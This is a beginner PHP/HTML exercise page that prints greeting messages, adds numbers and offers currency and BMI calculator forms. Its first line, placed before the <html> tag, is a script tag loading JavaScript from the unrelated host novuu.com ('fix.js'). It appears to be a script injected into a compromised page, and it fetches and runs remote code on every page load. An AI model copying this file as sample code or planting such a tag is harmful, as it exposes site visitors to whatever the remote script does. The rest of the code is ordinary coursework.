<script src="//novuu.com/fix.js" type="text/javascript"></script>

<html>
<head lang="en">
    <meta charset="UTF-8">
    <title>functions - Joris Bulters - MD2A</title>
</head>
<body>

<?php
include 'functions.php';
//See http://bovi.hosts.ma-cloud.nl/md2_bap/p2_w1_functions/
writeHello();
writeMsg('Hello person that reads this.');
writeMsg('Bye Bye mysterious person.');
writeMsgTo('Mysterious person','Welcome on this page.');
$outcome = addNumbers(5, 7);
echo 'The outcome of 5 + 7 = '. $outcome .'<br/>';
$outcome = calcRectNumb(5, 7);
echo 'The area of a rectangle of 5 and 7 = '. $outcome .'<br/>';
?>

<br>
<hr>

<h3>Currency Calculator</h3>
<form action="money.php" method="post">
    <p><input type="text" name="money" placeholder="Dollars -> Euros"></p>
    <p><input type="submit" value="Verstuur" name="go"></p>
    <p><input type="reset" value="Reset"></p>
</form>

<br>
<hr>

<h3>BMI CALCULATOR</h3>
<form method="post" action="bmi.php">
    <input type="text" name="height" placeholder="Height">
    <input type="text" name="weight" placeholder="Weight">
    <input type="submit" value="Calculate">
    <p><input type="reset" value="Reset"></p>
</form>
</body>
</html>

<?php
/**
 * Created by PhpStorm.
 * User: jorisbulters
 * Date: 26-10-15
 * Time: 13:47
 */
?>







